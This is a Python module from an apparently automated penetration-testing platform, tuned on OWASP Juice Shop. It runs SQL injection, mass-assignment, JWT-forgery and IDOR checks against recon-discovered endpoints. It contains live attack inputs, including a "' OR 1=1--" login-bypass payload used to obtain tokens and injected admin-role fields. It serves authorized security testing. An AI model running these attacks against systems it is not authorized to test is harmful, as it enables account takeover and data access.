"""Deterministic detection backbone — reliable scan path.

Drives the proven deterministic oracles (precision=1.0 on the benchmark) against
a target and persists every VALIDATED finding through the injected graph_memory.
No LLM, no MCP fleet, no agent lifecycle — so it cannot hang on the 300s task
timeout, the skill-selection LLM hook, or the sqlmap shell-out that strand
findings in the orchestrator.

Single source of truth for both the CLI runner (scripts/deterministic_scan_runner)
and the API endpoint (POST /engagements/{id}/scan/deterministic).

ponytail: checks are juice-shop-tuned (reused from the benchmark suite). The
generalization to arbitrary recon-discovered endpoints is the next step; this
module is the seam it plugs into.
"""
from __future__ import annotations

import asyncio
import os
from typing import Any, List, Tuple

from ai_osop.core.config import Severity, VulnClass
from ai_osop.core.models import Vulnerability

# check_id -> platform taxonomy / default severity. Unmapped -> UNKNOWN / HIGH.
_VC = {
    "sqli_login_bypass": VulnClass.SQLI,
    "sqli_search_error": VulnClass.SQLI,
    "idor_basket": VulnClass.IDOR,
    "jwt_forgery": VulnClass.JWT_ABUSE,
    "admin_registration": VulnClass.MASS_ASSIGNMENT,
    "xss_reflected": VulnClass.XSS,
    "ftp_directory_listing": VulnClass.BROKEN_ACCESS_CONTROL,
    "unauth_user_list": VulnClass.BROKEN_ACCESS_CONTROL,
    "weak_password_policy": VulnClass.AUTHENTICATION_WEAKNESS,
    "open_redirect": VulnClass.BROKEN_ACCESS_CONTROL,
}
_SEV = {
    "sqli_login_bypass": Severity.CRITICAL,
    "jwt_forgery": Severity.CRITICAL,
    "sqli_search_error": Severity.HIGH,
    "idor_basket": Severity.HIGH,
    "admin_registration": Severity.HIGH,
    "xss_reflected": Severity.HIGH,
    "weak_password_policy": Severity.MEDIUM,
    "open_redirect": Severity.MEDIUM,
    "ftp_directory_listing": Severity.MEDIUM,
    "unauth_user_list": Severity.MEDIUM,
}


def _load_suite():
    """Lazily import the proven check suite. Kept out of module scope so a path/
    import problem can only fail an actual scan call, never API startup."""
    import sys

    bench_dir = os.path.join(
        os.path.dirname(__file__), "..", "..", "..", "benchmarks", "juiceshop"
    )
    bench_dir = os.path.abspath(bench_dir)
    if bench_dir not in sys.path:
        sys.path.insert(0, bench_dir)
    import bench  # import-safe: its main() is __name__-guarded

    return bench


async def run_deterministic_scan(
    base_url: str,
    engagement_id: str,
    graph_memory: Any,
    *,
    per_check_timeout: float = 45.0,
) -> Tuple[List[Vulnerability], List[str], int]:
    """Run the deterministic suite against ``base_url`` and persist validated
    findings via ``graph_memory``.

    Returns (persisted_vulns, validated_check_ids, expected_total). recall is
    len(validated)/expected_total. Every check is bounded by per_check_timeout so
    a wedged probe becomes a datapoint, never a hang.
    """
    import httpx

    bench = _load_suite()
    expected = [m for m in bench.MANIFEST if m.expected and m.check_id in bench.CHECKS]
    validated: List[str] = []
    persisted: List[Vulnerability] = []

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=20) as client:
        target = bench.Target(base_url, client)
        for m in expected:
            try:
                res = await asyncio.wait_for(bench.CHECKS[m.check_id](target), timeout=per_check_timeout)
            except Exception:
                continue
            if not getattr(res, "validated", False):
                continue
            validated.append(m.check_id)
            vuln = Vulnerability(
                cwe=m.cwe,
                vuln_type=_VC.get(m.check_id, VulnClass.UNKNOWN),
                severity=_SEV.get(m.check_id, Severity.HIGH),
                title=m.name,
                description=f"[{m.owasp}] {m.name} — validated by deterministic oracle '{m.check_id}'.",
                evidence=[
                    {
                        "type": m.check_id,
                        "provenance": "deterministic_oracle",
                        "owasp": m.owasp,
                        "cwe": m.cwe,
                        **(getattr(res, "evidence", None) or {}),
                    }
                ],
                tool_source="deterministic_scan",
                confidence=getattr(res, "confidence", 1.0) or 1.0,
                validated=True,
                exploitability="high",
                impact="high",
                engagement_id=engagement_id,
            )
            try:
                await graph_memory.add_vulnerability(vuln)
                persisted.append(vuln)
            except Exception:
                pass  # a persist failure on one finding must not sink the rest

    return persisted, validated, len(expected)


async def _discovered_endpoints(graph_memory: Any, engagement_id: str) -> List[dict]:
    """Pull recon-discovered endpoints for the engagement straight from the graph."""
    drv = getattr(graph_memory, "_driver", None)
    if drv is None:
        return []
    q = (
        "MATCH (e:Endpoint {engagement_id: $eid}) "
        "RETURN e.url AS url, e.method AS method, e.query_keys AS query_keys, "
        "e.parameters AS parameters, e.has_body AS has_body, e.path AS path, "
        "e.body_schema_keys AS body_schema_keys "
        "LIMIT 1000"
    )
    out: List[dict] = []
    async with drv.session() as s:
        res = await s.run(q, eid=engagement_id)
        async for r in res:
            out.append(dict(r))
    return out


async def run_generalized_sqli(
    engagement_id: str,
    graph_memory: Any,
    *,
    per_check_timeout: float = 20.0,
) -> Tuple[List[Vulnerability], int]:
    """Drive the general SQLi oracles off RECON-DISCOVERED endpoints (not hardcoded
    paths): error-based on GET endpoints carrying params or a search-like path,
    auth-bypass on login-like POST endpoints. This is the generalization seam —
    it makes detection work on any in-scope target, not just Juice Shop. Returns
    (persisted, endpoints_examined).
    """
    import httpx

    from ai_osop.core.sqli_oracle import detect_error_based, detect_login_bypass, detect_time_blind

    eps = await _discovered_endpoints(graph_memory, engagement_id)
    persisted: List[Vulnerability] = []

    # Select injectable candidates and DEDUPE by shape (method+path+params) so a
    # 1000-URL surface (the same few paths with varied ids) collapses to a handful
    # of distinct injection points; cap breadth so the scan stays bounded.
    # ponytail: MAX_CANDIDATES=60 flat cap; make it scope-configurable if a target's
    # surface is genuinely that wide.
    MAX_CANDIDATES = 60
    candidates: list = []
    shapes: set = set()
    for ep in eps:
        url = ep.get("url")
        if not url:
            continue
        method = (ep.get("method") or "GET").upper()
        params = list(ep.get("query_keys") or []) + list(ep.get("parameters") or [])
        path = (ep.get("path") or "").lower()
        get_like = method == "GET" and (
            params or any(s in path for s in ("search", "find", "query", "filter"))
        )
        login_like = (ep.get("has_body") or method == "POST") and any(
            k in path for k in ("login", "signin", "authenticate", "session")
        )
        if not (get_like or login_like):
            continue
        shape = (method, path, tuple(sorted(params)))
        if shape in shapes:
            continue
        shapes.add(shape)
        candidates.append((url, params, get_like, login_like))
        if len(candidates) >= MAX_CANDIDATES:
            break

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as c:
        for url, params, get_like, login_like in candidates:
            ev = None
            try:
                if get_like:
                    ev = await asyncio.wait_for(
                        detect_error_based(c, url, param=(params[0] if params else None)),
                        timeout=per_check_timeout,
                    )
                if not ev and login_like:
                    ev = await asyncio.wait_for(detect_login_bypass(c, url), timeout=per_check_timeout)
                # Error-based and auth-bypass leak a signal (5xx error / session
                # token). If neither fired, run the time-blind oracle: a blind
                # injection that leaks NOTHING still sleeps measurably when
                # injected a SLEEP() — covers the largest real-world blind class.
                if not ev and get_like:
                    ev = await asyncio.wait_for(
                        detect_time_blind(
                            c, url, param=(params[0] if params else None),
                            request_timeout=per_check_timeout,
                        ),
                        timeout=per_check_timeout,
                    )
            except Exception:
                continue
            if not ev:
                continue
            technique = ev.get("technique", "sqli")
            vuln = Vulnerability(
                cwe="CWE-89",
                vuln_type=VulnClass.SQLI,
                severity=Severity.CRITICAL if technique == "auth_bypass" else Severity.HIGH,
                title=f"SQL Injection ({technique}) at {ev['endpoint']}",
                description=(
                    f"Deterministic oracle confirmed SQL injection at {ev['endpoint']} via "
                    f"{technique} — driven off a recon-discovered endpoint (payload: {ev['payload']!r})."
                ),
                evidence=[{"type": "sqli_oracle", "provenance": "http", "discovered": True, **ev}],
                tool_source="deterministic_scan_generalized",
                confidence=float(ev.get("confidence", 1.0)),
                validated=True,
                exploitability="high",
                impact="high",
                engagement_id=engagement_id,
            )
            try:
                await graph_memory.add_vulnerability(vuln)
                persisted.append(vuln)
            except Exception:
                pass

    return persisted, len(eps)


async def _detect_mass_assignment(client, url: str, body_keys: list, method: str = "POST"):
    """Baseline-suppressed mass-assignment oracle (ported from vuln_agent): a
    privileged field is attacker-controlled only if it appears after injection but
    was ABSENT from a control request without it. Returns evidence dict or None."""
    import json as _json
    import uuid as _uuid

    inject = {"role": "admin", "isAdmin": True, "isDeluxe": True}

    def _valid_body():
        b = {}
        for k in (body_keys or []):
            kl = str(k).lower()
            if "email" in kl or kl in ("mail", "e-mail"):
                b[k] = f"osop-ma-{_uuid.uuid4().hex[:10]}@recon.test"
            elif "pass" in kl or "pwd" in kl:
                b[k] = "OSOPmass1!"
            else:
                b[k] = "osop"
        return b

    def _reflects(text, k, v):
        try:
            flat = _json.dumps(_json.loads(text))
        except Exception:
            flat = text or ""
        return f'"{k}":{_json.dumps(v)}' in flat or f'"{k}": {_json.dumps(v)}' in flat

    try:
        ctrl = await client.request(method, url, json=_valid_body())
        inj = await client.request(method, url, json={**_valid_body(), **inject})
    except Exception:
        return None
    accepted = {k: v for k, v in inject.items() if _reflects(inj.text, k, v) and not _reflects(ctrl.text, k, v)}
    if not accepted:
        return None
    return {
        "technique": "mass_assignment",
        "endpoint": url,
        "accepted_fields": accepted,
        "injected": inject,
        "http_status": inj.status_code,
        "provenance": "reflected",  # no independent read-back here -> manual-confirm lead
        "confidence": 0.5,
        "proof": "privileged field accepted in create response and absent from a baseline control request",
    }


async def run_generalized_massassign(
    engagement_id: str, graph_memory: Any, *, per_check_timeout: float = 20.0
) -> Tuple[List[Vulnerability], int]:
    """Drive the mass-assignment oracle off recon-discovered create-like endpoints."""
    import httpx

    eps = await _discovered_endpoints(graph_memory, engagement_id)
    persisted: List[Vulnerability] = []
    shapes: set = set()
    candidates: list = []
    for ep in eps:
        url = ep.get("url")
        if not url:
            continue
        method = (ep.get("method") or "GET").upper()
        path = (ep.get("path") or "").lower()
        body_keys = list(ep.get("body_schema_keys") or [])
        create_like = method in ("POST", "PUT", "PATCH") and any(
            s in path for s in ("user", "register", "signup", "account", "profile", "create")
        )
        if not create_like or not body_keys:
            continue
        shape = (method, path, tuple(sorted(body_keys)))
        if shape in shapes:
            continue
        shapes.add(shape)
        candidates.append((url, method, body_keys))
        if len(candidates) >= 40:
            break

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as c:
        for url, method, body_keys in candidates:
            try:
                ev = await asyncio.wait_for(
                    _detect_mass_assignment(c, url, body_keys, method), timeout=per_check_timeout
                )
            except Exception:
                continue
            if not ev:
                continue
            vuln = Vulnerability(
                cwe="CWE-915",
                vuln_type=VulnClass.MASS_ASSIGNMENT,
                severity=Severity.MEDIUM,  # reflected-only lead; readback would raise to HIGH
                title=f"Mass assignment via {', '.join(ev['accepted_fields'])} at {ev['endpoint']}",
                description=(
                    f"The endpoint {ev['endpoint']} accepted attacker-supplied privileged field(s) "
                    f"{ev['accepted_fields']} absent from a baseline control — driven off a "
                    f"recon-discovered endpoint. Confirm persistence via read-back before submitting."
                ),
                evidence=[{"type": "mass_assignment", "provenance": "http", "discovered": True, **ev}],
                tool_source="deterministic_scan_generalized",
                confidence=float(ev.get("confidence", 0.5)),
                validated=False,  # reflected-only -> manual-confirm; not asserted validated
                exploitability="high",
                impact="high",
                engagement_id=engagement_id,
            )
            try:
                await graph_memory.add_vulnerability(vuln)
                persisted.append(vuln)
            except Exception:
                pass
    return persisted, len(candidates)


async def run_generalized_jwt(
    engagement_id: str, graph_memory: Any, *, per_check_timeout: float = 30.0
) -> Tuple[List[Vulnerability], int]:
    """Drive real JWT forgery (alg:none / weak-secret / kid-injection) off
    recon-discovered endpoints. Needs a login endpoint (to mint a base token) and
    an identity-reflecting endpoint (to confirm a forged identity is accepted).
    Token acquisition: SQLi auth-bypass first, else register+login (juice-shop
    pattern via the reused Target helpers)."""
    import uuid as _uuid
    from urllib.parse import urlparse

    import httpx

    from ai_osop.core.jwt_tester import JWTTester

    bench = _load_suite()
    eps = await _discovered_endpoints(graph_memory, engagement_id)

    base = None
    login_url = None
    identity_url = None
    for ep in eps:
        url = ep.get("url")
        if not url:
            continue
        if base is None:
            u = urlparse(url)
            base = f"{u.scheme}://{u.netloc}"
        path = (ep.get("path") or "").lower()
        method = (ep.get("method") or "GET").upper()
        if login_url is None and "login" in path and (method == "POST" or ep.get("has_body")):
            login_url = url
        if identity_url is None and any(
            s in path for s in ("whoami", "/me", "userinfo", "currentuser", "profile", "account")
        ):
            identity_url = url
    if not (login_url and identity_url and base):
        return [], 0

    persisted: List[Vulnerability] = []
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as c:
        t = bench.Target(base, c)
        token = None
        try:
            token = await t.login("' OR 1=1--", "x")  # SQLi bypass mints a token cheaply
        except Exception:
            token = None
        if not token:
            try:
                email = f"osop-jwt-{_uuid.uuid4().hex[:10]}@recon.test"
                await t.register(email, "OSOPjwt1!")
                token = await t.login(email, "OSOPjwt1!")
            except Exception:
                token = None
        if not token:
            return [], 0
        try:
            tester = JWTTester(verify_url=identity_url, base_token=token, method="GET", timeout=15.0)
            findings = await asyncio.wait_for(tester.run(), timeout=per_check_timeout)
        except Exception:
            return [], 0
        for f in [x for x in findings if getattr(x, "confirmed", False)]:
            vuln = Vulnerability(
                cwe="CWE-347",
                vuln_type=VulnClass.JWT_ABUSE,
                severity=Severity.CRITICAL,
                title=f"JWT authentication bypass ({f.technique}) at {identity_url}",
                description=(
                    f"{getattr(f, 'detail', '')} Confirmed at {identity_url} — driven off "
                    f"recon-discovered login/identity endpoints."
                ),
                evidence=[
                    {
                        "type": "jwt_forgery",
                        "provenance": "jwt_tester",
                        "discovered": True,
                        "technique": f.technique,
                        "verify_url": identity_url,
                        "detail": getattr(f, "detail", "")[:200],
                    }
                ],
                tool_source="deterministic_scan_generalized",
                confidence=0.95,
                validated=True,
                exploitability="high",
                impact="high",
                engagement_id=engagement_id,
            )
            try:
                await graph_memory.add_vulnerability(vuln)
                persisted.append(vuln)
            except Exception:
                pass
    return persisted, 1


def _sub_last_id(url: str, new_id: Any) -> str:
    """Replace an id-like trailing path segment (numeric, {id}, :id, or *id*)."""
    from urllib.parse import urlparse, urlunparse

    u = urlparse(url)
    parts = u.path.rstrip("/").split("/")
    if parts and (
        parts[-1].isdigit()
        or "id" in parts[-1].lower()
        or parts[-1].startswith(("{", ":"))
    ):
        parts[-1] = str(new_id)
    return urlunparse(u._replace(path="/".join(parts)))


async def run_generalized_idor(
    engagement_id: str, graph_memory: Any, *, per_check_timeout: float = 30.0
) -> Tuple[List[Vulnerability], int]:
    """Generalized IDOR / broken-object-level-authorization via the REAL
    DifferentialAuthEngine: register two identities, have the attacker read the
    victim's object on an id-bearing endpoint, and confirm cross-account access
    with anonymous-baseline FP suppression (owner 200, attacker 200 same data,
    anon denied). Low false positives by construction — the engine, not a
    heuristic, makes the call."""
    import os
    import re

    import httpx

    from ai_osop.core.diff_auth_engine import DifferentialAuthEngine
    from ai_osop.core.models import Resource

    bench = _load_suite()
    eps = await _discovered_endpoints(graph_memory, engagement_id)

    base = None
    id_endpoints: list = []
    for ep in eps:
        url = ep.get("url")
        if not url:
            continue
        if base is None:
            from urllib.parse import urlparse

            u = urlparse(url)
            base = f"{u.scheme}://{u.netloc}"
        method = (ep.get("method") or "GET").upper()
        path = (ep.get("path") or "").lower()
        if method == "GET" and re.search(r"/\d+/?$|/\{?\w*id\}?/?$|/:\w+/?$", path):
            id_endpoints.append(url)
    if not (base and id_endpoints):
        return [], 0

    persisted: List[Vulnerability] = []
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as c:
        t = bench.Target(base, c)
        engine = DifferentialAuthEngine(session_memory=None)
        victim = f"osop_v_{os.urandom(4).hex()}@recon.test"
        attacker = f"osop_a_{os.urandom(4).hex()}@recon.test"
        try:
            await t.register(victim, "OSOPidor1!")
            await t.register(attacker, "OSOPidor1!")
            tok_v = await t.login(victim, "OSOPidor1!")
            tok_a = await t.login(attacker, "OSOPidor1!")
        except Exception:
            return [], 0
        if not (tok_v and tok_a):
            return [], 0
        vid = bench._bid_from_token(tok_v)  # victim's object id (basket/user id from JWT)
        if not vid:
            return [], 0

        seen: set = set()
        for url in id_endpoints[:30]:
            tgt = _sub_last_id(url, vid)
            if tgt in seen:
                continue
            seen.add(tgt)
            try:
                owner = await c.get(tgt, headers={"Authorization": f"Bearer {tok_v}"})
                atk = await c.get(tgt, headers={"Authorization": f"Bearer {tok_a}"})
                anon = await c.get(tgt)
                ev_owner = bench._resp_evidence(owner)
                ev_atk = bench._resp_evidence(atk)
                ev_atk["user_label"] = "attacker"
                ev_anon = bench._resp_evidence(anon)
                resource = Resource(
                    id=f"res:{vid}", type="object", value=str(vid),
                    owner_identity_id=victim, metadata={}, engagement_id=engagement_id,
                )
                finding = await asyncio.wait_for(
                    engine.compare(
                        identity_a_evidence=ev_owner,
                        identity_b_evidence=ev_atk,
                        resource=resource,
                        expected_allowed=False,
                        anonymous_evidence=ev_anon,
                    ),
                    timeout=per_check_timeout,
                )
            except Exception:
                continue
            if not finding or getattr(finding, "confidence", 0) < 0.5:
                continue
            vuln = Vulnerability(
                cwe="CWE-639",
                vuln_type=VulnClass.IDOR,
                severity=Severity.HIGH,
                title=f"IDOR / broken object-level authorization at {tgt}",
                description=(
                    f"An attacker identity read the victim's object at {tgt} — confirmed by the "
                    f"DifferentialAuthEngine ({getattr(finding, 'category', 'cross_account')}, "
                    f"confidence {getattr(finding, 'confidence', 0)}). Driven off a recon-discovered "
                    f"id-bearing endpoint with anonymous-baseline FP suppression."
                ),
                evidence=[{
                    "type": "idor", "provenance": "diff_auth", "discovered": True,
                    "endpoint": tgt, "category": getattr(finding, "category", ""),
                    "diff": getattr(finding, "evidence_diff", ""),
                    "attacker_status": ev_atk.get("status_code"),
                    "anon_status": ev_anon.get("status_code"),
                }],
                tool_source="deterministic_scan_generalized",
                confidence=float(getattr(finding, "confidence", 0.9)),
                validated=True,
                exploitability="high",
                impact="high",
                engagement_id=engagement_id,
            )
            try:
                await graph_memory.add_vulnerability(vuln)
                persisted.append(vuln)
            except Exception:
                pass
    return persisted, len(id_endpoints)


async def run_generalized_scan(
    engagement_id: str, graph_memory: Any
) -> Tuple[List[Vulnerability], int]:
    """Combined generalized pass over recon-discovered endpoints: SQLi + mass
    assignment + JWT forgery + IDOR — driven off the discovered surface with
    deterministic/engine oracles (no LLM, no agent lifecycle)."""
    sqli, examined = await run_generalized_sqli(engagement_id, graph_memory)
    ma, _ = await run_generalized_massassign(engagement_id, graph_memory)
    jwt, _ = await run_generalized_jwt(engagement_id, graph_memory)
    idor, _ = await run_generalized_idor(engagement_id, graph_memory)
    return sqli + ma + jwt + idor, examined


# Common REST/API paths covering the patterns the generalized oracles key off:
# auth (login), identity (whoami), search (GET param), create (body), id-bearing.
_COMMON_ENDPOINTS = [
    ("/rest/user/login", "POST", ["email", "password"], True),
    ("/rest/user/whoami", "GET", [], False),
    ("/rest/products/search", "GET", ["q"], False),
    ("/rest/basket/1", "GET", [], False),
    ("/api/Users", "POST", ["email", "password"], True),
    ("/api/Users/1", "GET", [], False),
    ("/api/login", "POST", ["email", "password"], True),
    ("/api/register", "POST", ["email", "password"], True),
    ("/api/users", "GET", [], False),
    ("/api/users/1", "GET", [], False),
    ("/api/v1/users/1", "GET", [], False),
    ("/api/search", "GET", ["q"], False),
    ("/api/me", "GET", [], False),
    ("/api/account", "GET", [], False),
    ("/api/orders/1", "GET", [], False),
    ("/api/products", "GET", [], False),
    ("/rest/user/authentication-details", "GET", [], False),
]


async def _crawl_api_paths(c, base: str) -> set:
    """Crawl the base page + its script bundles for /rest//api/ endpoint literals —
    real, target-agnostic content discovery, richer than a fixed wordlist."""
    import re

    rx = re.compile(r"""["'`](/(?:rest|api)/[A-Za-z0-9_\-./]+)""")
    paths: set = set()
    try:
        html = (await c.get(base + "/")).text[:200000]
    except Exception:
        return paths
    for m in rx.findall(html):
        paths.add(m.split("?")[0].rstrip("/"))
    srcs = re.findall(r"""<script[^>]+src=["']([^"']+)["']""", html)[:6]
    for src in srcs:
        u = src if src.startswith("http") else base + "/" + src.lstrip("/")
        try:
            js = (await c.get(u)).text[:600000]
        except Exception:
            continue
        for m in rx.findall(js):
            paths.add(m.split("?")[0].rstrip("/"))
    return paths


def _infer_shape(path: str):
    """Guess (method, keys, has_body) for a crawled path."""
    pl = path.lower()
    if any(k in pl for k in ("login", "signin", "authenticate")):
        return "POST", ["email", "password"], True
    if any(k in pl for k in ("search", "find", "query", "filter")):
        return "GET", ["q"], False
    return "GET", [], False


async def bootstrap_discovery(
    base_url: str, engagement_id: str, graph_memory: Any, *, timeout: float = 10.0
) -> int:
    """Content discovery: CRAWL the target (base page + JS bundles) for /rest//api/
    endpoints AND probe a common-path wordlist, persisting the live ones as
    discovered endpoints so a generalized scan self-seeds a real surface without the
    slower/flakier browser/orchestrator recon. A path counts as present if it does
    not 404 and looks like an API (/rest, /api, or JSON) — sidestepping SPA
    catch-all false positives. Returns the number of endpoints seeded.
    """
    import httpx

    from ai_osop.core.models import Endpoint

    base = base_url.rstrip("/")
    seeded = 0
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=timeout) as c:
        # merge wordlist + crawled surface (crawled paths deduped against wordlist)
        probe = list(_COMMON_ENDPOINTS)
        known = {p for p, *_ in _COMMON_ENDPOINTS}
        try:
            crawled = await _crawl_api_paths(c, base)
        except Exception:
            crawled = set()
        for cp in crawled:
            if cp not in known:
                probe.append((cp, *_infer_shape(cp)))
                known.add(cp)
        for path, method, keys, has_body in probe[:150]:
            url = base + path
            try:
                r = await c.get(url)  # GET probes existence for GET and POST alike (405/401/400 == present)
            except Exception:
                continue
            if r.status_code == 404:
                continue
            ct = (r.headers.get("content-type") or "").lower()
            if not (path.startswith(("/rest", "/api")) or "json" in ct):
                continue  # skip SPA catch-all HTML
            try:
                await graph_memory.add_endpoint(Endpoint(
                    url=url, method=method, engagement_id=engagement_id, path=path, type="api",
                    query_keys=(keys if method == "GET" else []),
                    has_body=has_body,
                    body_schema_keys=(keys if has_body else []),
                ))
                seeded += 1
            except Exception:
                pass
    return seeded
